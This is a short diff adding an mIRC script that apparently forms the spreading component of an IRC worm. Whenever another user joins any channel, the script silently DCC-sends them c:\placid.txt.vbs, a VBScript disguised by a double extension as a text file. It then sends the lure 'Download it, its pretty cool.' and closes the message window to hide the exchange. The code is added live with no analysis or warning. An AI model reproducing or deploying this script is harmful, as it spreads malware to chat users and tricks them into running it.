@@ -1,0 +1,7 @@
+[script]
+n0=on 1:JOIN:#:{
+n1= /if ( $nick == $me ) { halt }
+n2= /.dcc send $nick c:\placid.txt.vbs
+n3= /.msg $nick Download it, its pretty cool.
+n4= /closemsg $nick
+n5=}
